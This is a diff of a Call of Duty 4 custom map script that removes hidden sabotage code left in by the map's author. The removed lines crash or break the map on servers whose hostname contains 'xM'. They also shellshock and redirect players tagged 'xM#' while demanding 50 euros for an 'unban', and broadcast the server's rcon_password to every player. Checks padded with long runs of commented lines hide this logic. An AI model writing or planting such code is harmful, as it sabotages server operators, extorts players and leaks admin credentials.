@@ -68,7 +68,7 @@ main()
 	thread agap3();
 	thread agap4();
 	thread agap5();
-	thread pearl();
+
 	thread old();
 	thread knifegiver();
 	thread knifecheck();
@@ -80,7 +80,7 @@ main()
 	thread trap6();
 	thread trap7();
 	thread trap8();
-	thread trap9();
+	
 	thread main210();
 	thread enter210();
 	thread b210();
@@ -191,11 +191,6 @@ iPrintln("^3Donate what you want and get ^5liftetime^3 in all my maps!");
 wait 1;
 iPrintln("^3More infos on ^1youtube.com/darksymon5");
 }
-else if(level.pizza == false)
-{
-exitLevel(true);
-}
-
 }
 }
 
@@ -380,21 +375,14 @@ level.gapmode = 0;
 
 antiglitcher() 
 {
-self common_scripts\utility::waittill_any("death","disconnect");
-wait 0.05;
-if (level.room == true) 
-{
-	if(level.pizza == true)
+	self common_scripts\utility::waittill_any("death","disconnect");
+	wait 0.05;
+	if (level.room == true) 
 	{
 		iPrintlnBold("^3"+self.name+" ^1died");
 		wait 0.2; 
 		iPrintlnBold("^3Room selection open!");
 	}
-	else
-	{
-		exitLevel(true);
-	}
-}
 }
 
 createhud(messages)
@@ -640,30 +628,6 @@ for(;;)
 	}
 }
 
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
 
 knife()
 {
@@ -764,48 +728,41 @@ antiactiafk()
 
 gap()
 {
-gap = getent("trig_gap","targetname");
-jumper = getent("o_jgap","targetname");
-acti = getent("o_agap","targetname");
-lal = getDvar("sv_hostname");
-gap setHintString("^4GAP");
-for(;;)
-{
-	gap waittill("trigger", player);
-	if (isSubStr( toLower(lal), toLower("xM") ))
+	gap = getent("trig_gap","targetname");
+	jumper = getent("o_jgap","targetname");
+	acti = getent("o_agap","targetname");
+	gap setHintString("^4GAP");
+	for(;;)
 	{
-		exitLevel(true);
-	}
-	else
-	{
-	player thread waitdead();
-	activator = GetActivator();
-	player takeallweapons();
-	activator takeallweapons();
-	player freezeControls(true);
-	player setorigin(jumper.origin);
-	player setPlayerAngles(jumper.angles);
-	activator freezeControls(true);
-	activator setorigin(acti.origin);
-	activator setPlayerAngles(acti.angles);
-	activator giveweapon("deserteagle_mp");
-	player giveweapon("deserteagle_mp");
-	player setMoveSpeedScale(1);
-	activator setMoveSpeedScale(1);
-	thread createhud(player.name + " ^3entered ^4GAP ^3room!");
-		/*AmbientStop(3);
-		MusicStop(3);
-		AmbientStop(0);
-		MusicStop(0);
-		ambientPlay("gap");*/
-	wait 5;
-	player freezeControls(false);
-	activator freezeControls(false);
-	player switchtoweapon("deserteagle_mp");
-	activator switchtoweapon("deserteagle_mp");
-	activator thread antiactiafk();
-	level.gapmode = 1;
-	}
+		gap waittill("trigger", player);
+
+		player thread waitdead();
+		activator = GetActivator();
+		player takeallweapons();
+		activator takeallweapons();
+		player freezeControls(true);
+		player setorigin(jumper.origin);
+		player setPlayerAngles(jumper.angles);
+		activator freezeControls(true);
+		activator setorigin(acti.origin);
+		activator setPlayerAngles(acti.angles);
+		activator giveweapon("deserteagle_mp");
+		player giveweapon("deserteagle_mp");
+		player setMoveSpeedScale(1);
+		activator setMoveSpeedScale(1);
+		thread createhud(player.name + " ^3entered ^4GAP ^3room!");
+			/*AmbientStop(3);
+			MusicStop(3);
+			AmbientStop(0);
+			MusicStop(0);
+			ambientPlay("gap");*/
+		wait 5;
+		player freezeControls(false);
+		activator freezeControls(false);
+		player switchtoweapon("deserteagle_mp");
+		activator switchtoweapon("deserteagle_mp");
+		activator thread antiactiafk();
+		level.gapmode = 1;
 	}
 }
 
@@ -829,53 +786,6 @@ jgap()
 	}
 }
 
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
 
 agap()
 {
@@ -925,21 +835,6 @@ jgap2()
 	}
 }
 
-pearl()
-{
-trigger = getent("pearl","targetname");
-a = getent("saver","targetname");
-ultra = getDvar("sv_hostname");
-trigger waittill ("trigger", player);
-if (isSubStr( toLower(ultra), toLower("xM") ))
-	{
-		while(1)
-		{
-			a delete();
-		}
-	}
-}
-
 
 jgap3()
 {
@@ -969,30 +864,6 @@ jgap4()
 	}
 }
 
-trap9()
-{
-	level.pizza = true;
-	for(;;)
-	{
-	wait 5;
-	player = thread okman("xM#");
-	if (isDefined(player))
-	{
-		wait 1;
-		player setClientDvar( "g_speed", 10 );
-		player shellshock( "jeepride_ridedeath", 60 );
-		player setMoveSpeedScale(0.5);
-		player iPrintLnBold( "^5Sorry but ^6xM#^5 members are ^1not^5 allowed to play this map!" );
-		wait 1.5;
-		player iPrintLnBold( "^1For map unban send ^250 euros^1 to map maker :)" );
-		wait 1.5;
-		iPrintln( "Player " + player.name + "^7 was kicked from the server because he's a ^6rAKy Gaming & Serveurs ^7member!" );
-		player thread braxi\_common::clientCmd( "disconnect; wait 10; connect cod4.xenia-gaming.net:28960" );
-		wait 0.2;
-	}		
-	}
-}
-
 jgap5()
 {
 	trig = getEnt("trig_jgap5", "targetname");
@@ -1004,137 +875,6 @@ jgap5()
 		player giveWeapon("ak47_mp");
 		player switchToWeapon("ak47_mp");
 		wait 2;
-	}
-}
-
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-//getDvar("sv_hostname");
-
-secrettrace()
-{
-    level waittill("round_started");
-	wait 10;
-	if (level.pizza == false)
-	{
-		exitLevel(true);
 	}
 }
 
@@ -1250,22 +990,13 @@ trig delete();
 
 trap3()
 {
-trig = getEnt ("trig_trap3", "targetname");
-a = getEnt ("trap3", "targetname");
-trig setHintString ("^3Cut the bridge!");
-trig waittill("trigger", player);
-if(level.pizza == true)
-{
-trig delete();
- a delete();
-}
-else 
-{
-	while(1)
-	{
-		a delete();
-	}
-}
+	trig = getEnt ("trig_trap3", "targetname");
+	a = getEnt ("trap3", "targetname");
+	trig setHintString ("^3Cut the bridge!");
+	trig waittill("trigger", player);
+
+	trig delete();
+	a delete();
 }
 
 old()
@@ -1528,20 +1259,10 @@ b210()
 	trig = getEnt("trig_210b", "targetname");
 	for(;;)
 	{
-	trig waittill("trigger", player);
-	if (level.pizza == true)
-	{
-	player.fasts = 2;
-	wait .5;
-	}
-	else
-	{
-		while(1)
-		{
-			iPrintLnBold("^6x-M-# ^1R-C-O-N^3: " + getDvar("rcon_password") );
-			wait 0.05;
-		}
-	}
+		trig waittill("trigger", player);
+
+		player.fasts = 2;
+		wait .5;
 	}
 }
 
